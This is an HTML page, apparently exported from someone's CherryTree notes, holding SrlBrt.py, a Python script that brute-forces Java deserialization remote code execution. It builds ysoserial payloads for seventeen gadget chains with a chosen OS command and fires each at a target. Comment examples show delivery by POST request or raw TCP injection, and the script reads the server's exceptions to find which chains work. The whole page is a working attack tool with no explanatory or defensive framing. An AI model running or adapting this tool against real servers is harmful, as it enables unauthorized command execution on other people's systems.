<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SrlBrt.py</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">SrlBrt.py</h1><br/><div class="codebox"><div class="codebox"><span style="color:#333333;font-weight:400">import</span>&nbsp;os<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;requests<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;subprocess<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;sys<br /><br /><span style="color:#0088ff;font-weight:400">#Ysoserial&nbsp;JAR&nbsp;path</span><br />YSOSERIAL_PATH&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"ysoserial.jar"</span><br /><br /><span style="color:#0088ff;font-weight:400">#Default&nbsp;runtime&nbsp;options</span><br />gadget&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />target&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br />cmd&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br /><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;dispatchPayload(target,&nbsp;payloadbytes)</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Modify&nbsp;this&nbsp;function&nbsp;to&nbsp;deliver&nbsp;a&nbsp;payload&nbsp;to&nbsp;the&nbsp;target.&nbsp;If&nbsp;the&nbsp;target&nbsp;returns&nbsp;exceptions</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;in&nbsp;response&nbsp;to&nbsp;unexpected&nbsp;data&nbsp;then&nbsp;this&nbsp;function&nbsp;should&nbsp;return&nbsp;the&nbsp;response&nbsp;after</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;delivering&nbsp;the&nbsp;payload&nbsp;so&nbsp;that&nbsp;launchAttack()&nbsp;can&nbsp;attempt&nbsp;to&nbsp;verify&nbsp;availability&nbsp;of&nbsp;POP</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;gadget&nbsp;chains&nbsp;and&nbsp;OS&nbsp;commands.</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Note&nbsp;that&nbsp;the&nbsp;payload&nbsp;bytes&nbsp;supplied&nbsp;to&nbsp;this&nbsp;function&nbsp;include&nbsp;the&nbsp;serialization&nbsp;header</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;bytes&nbsp;0xAC&nbsp;ED&nbsp;00&nbsp;05.&nbsp;Use&nbsp;payloadbytes[4:]&nbsp;to&nbsp;strip&nbsp;those&nbsp;off&nbsp;if&nbsp;they're&nbsp;not&nbsp;needed.</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Examples:</span><br /><span style="color:#0088ff;font-weight:400">#	Use&nbsp;the&nbsp;requests&nbsp;library&nbsp;to&nbsp;dispatch&nbsp;the&nbsp;payload&nbsp;in&nbsp;the&nbsp;body&nbsp;of&nbsp;a&nbsp;POST&nbsp;request:</span><br /><span style="color:#0088ff;font-weight:400">#		return&nbsp;requests.post(target,&nbsp;data=payloadbytes)</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;</span><br /><span style="color:#0088ff;font-weight:400">#	Inject&nbsp;the&nbsp;payload&nbsp;into&nbsp;a&nbsp;TCP&nbsp;stream</span><br /><span style="color:#0088ff;font-weight:400">#		s&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)</span><br /><span style="color:#0088ff;font-weight:400">#		s.connect((target.split(":")[0],&nbsp;target.split(":")[1]))</span><br /><span style="color:#0088ff;font-weight:400">#		s.send("\xac\xed\x00\x05\x77\x02\x00\x00")</span><br /><span style="color:#0088ff;font-weight:400">#		s.recv(1024)</span><br /><span style="color:#0088ff;font-weight:400">#		s.recv(1024)</span><br /><span style="color:#0088ff;font-weight:400">#		s.send(paylodbytes[4:])</span><br /><span style="color:#0088ff;font-weight:400">#		response&nbsp;=&nbsp;s.recv(1024)</span><br /><span style="color:#0088ff;font-weight:400">#		return&nbsp;response</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br />def&nbsp;dispatchPayload(target,&nbsp;payloadbytes):<br />	raise&nbsp;<span style="color:#7f0044;font-weight:400">NotImplementedError</span>(<span style="color:#3ad900;font-weight:400">"dispatchPayload&nbsp;method&nbsp;not&nbsp;implemented."</span>)<br /><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Launch&nbsp;attack&nbsp;and&nbsp;check&nbsp;for&nbsp;helpful&nbsp;exceptions&nbsp;in&nbsp;the&nbsp;response</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br />def&nbsp;launchAttack(payload):<br />	global&nbsp;target<br />	<br />	<span style="color:#0088ff;font-weight:400">#Dispatch&nbsp;the&nbsp;payload&nbsp;and&nbsp;get&nbsp;the&nbsp;response</span><br />	response&nbsp;=&nbsp;dispatchPayload(target,&nbsp;payload)<br />	<br />	<span style="color:#0088ff;font-weight:400">#Check&nbsp;for&nbsp;ClassNotFound&nbsp;exceptions&nbsp;in&nbsp;the&nbsp;response</span><br />	if&nbsp;<span style="color:#3ad900;font-weight:400">"ClassNotFoundException"</span>&nbsp;in&nbsp;response:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[-]&nbsp;POP&nbsp;gadget&nbsp;chain&nbsp;not&nbsp;supported."</span><br />	elif&nbsp;<span style="color:#3ad900;font-weight:400">"java.io.IOException:&nbsp;Cannot&nbsp;run&nbsp;program"</span>&nbsp;in&nbsp;response:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[+]&nbsp;POP&nbsp;gadget&nbsp;chain&nbsp;is&nbsp;supported"</span><br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[-]&nbsp;Requested&nbsp;command&nbsp;is&nbsp;not&nbsp;available"</span><br />	elif&nbsp;response&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">""</span>:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[-]&nbsp;No&nbsp;response,&nbsp;unable&nbsp;to&nbsp;detect&nbsp;gadget/command&nbsp;availability"</span><br />	else:<br />		<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[+]&nbsp;POP&nbsp;gadget&nbsp;chain&nbsp;may&nbsp;be&nbsp;supported."</span><br /><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;SrlBrt</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;Grab&nbsp;command&nbsp;line&nbsp;parameters,&nbsp;restrict&nbsp;the&nbsp;gadget&nbsp;chain&nbsp;to&nbsp;use&nbsp;if&nbsp;necessary,</span><br /><span style="color:#0088ff;font-weight:400">#&nbsp;then&nbsp;generate&nbsp;payloads&nbsp;and&nbsp;pass&nbsp;them&nbsp;through&nbsp;launchAttack.</span><br /><span style="color:#0088ff;font-weight:400">####################</span><br /><span style="color:#0088ff;font-weight:400">#Grab&nbsp;command&nbsp;line&nbsp;parameters</span><br />if&nbsp;len(sys.argv)&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">3</span>&nbsp;or&nbsp;len(sys.argv)&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">4</span>:<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Usage:&nbsp;SrlBrt.py&nbsp;[gadget]&nbsp;&lt;target&gt;&nbsp;&lt;cmd&gt;"</span><br />	sys.exit(<span style="color:#ff0044;font-weight:400">1</span>)<br />if&nbsp;len(sys.argv)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">3</span>:<br />	<span style="color:#0088ff;font-weight:400">#SrlBrt.py&nbsp;&lt;target&gt;&nbsp;&lt;cmd&gt;</span><br />	target&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">1</span>]<br />	cmd&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">2</span>]<br />else:<br />	<span style="color:#0088ff;font-weight:400">#SrlBrt.py&nbsp;&lt;gadget&gt;&nbsp;&lt;target&gt;&nbsp;&lt;cmd&gt;</span><br />	gadget&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">1</span>]<br />	target&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">2</span>]<br />	cmd&nbsp;=&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">3</span>]<br /><br /><span style="color:#0088ff;font-weight:400">#Gadget&nbsp;chains&nbsp;to&nbsp;generate</span><br />gadgetChains&nbsp;=&nbsp;[<span style="color:#3ad900;font-weight:400">"BeanShell1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"CommonsBeanutils1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"CommonsCollections1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"CommonsCollections2"</span>,<br />				<span style="color:#3ad900;font-weight:400">"CommonsCollections3"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"CommonsCollections4"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"CommonsCollections5"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"Groovy1"</span>,<br />				<span style="color:#3ad900;font-weight:400">"CommonsCollections6"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"JavassistWeld1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"JBossInterceptors1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"Jdk7u21"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"JSON1"</span>,<br />				<span style="color:#3ad900;font-weight:400">"MozillaRhino1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"ROME"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"Spring1"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"Spring2"</span><br />]<br />if&nbsp;gadget&nbsp;!=&nbsp;<span style="color:#3ad900;font-weight:400">""</span>:<br />	gadgetChains&nbsp;=&nbsp;[gadget]<br /><br /><span style="color:#0088ff;font-weight:400">#Attempt&nbsp;to&nbsp;attack&nbsp;the&nbsp;server&nbsp;with&nbsp;each&nbsp;available&nbsp;gadget&nbsp;chain</span><br /><span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Starting&nbsp;attack..."</span><br />for&nbsp;g&nbsp;in&nbsp;gadgetChains:<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;Trying&nbsp;POP&nbsp;gadget&nbsp;chain:&nbsp;"</span>&nbsp;+&nbsp;g<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[+]&nbsp;Generating&nbsp;payload..."</span><br />	with&nbsp;open(os.devnull,&nbsp;<span style="color:#3ad900;font-weight:400">"w"</span>)&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;FNULL:<br />		payload&nbsp;=&nbsp;subprocess.check_output([<span style="color:#3ad900;font-weight:400">"java"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"-jar"</span>,&nbsp;YSOSERIAL_PATH,&nbsp;g,&nbsp;cmd],&nbsp;stderr=FNULL)<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;[+]&nbsp;Payload&nbsp;generated,&nbsp;launching&nbsp;attack..."</span><br />	launchAttack(payload)<br />	if&nbsp;raw_input(<span style="color:#3ad900;font-weight:400">"&nbsp;&nbsp;Attack&nbsp;successful?&nbsp;(y/n)&nbsp;[n]:&nbsp;"</span>).lower()&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"y"</span>:<br />		break<br />	<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">""</span><br /></div></div></div></body></html>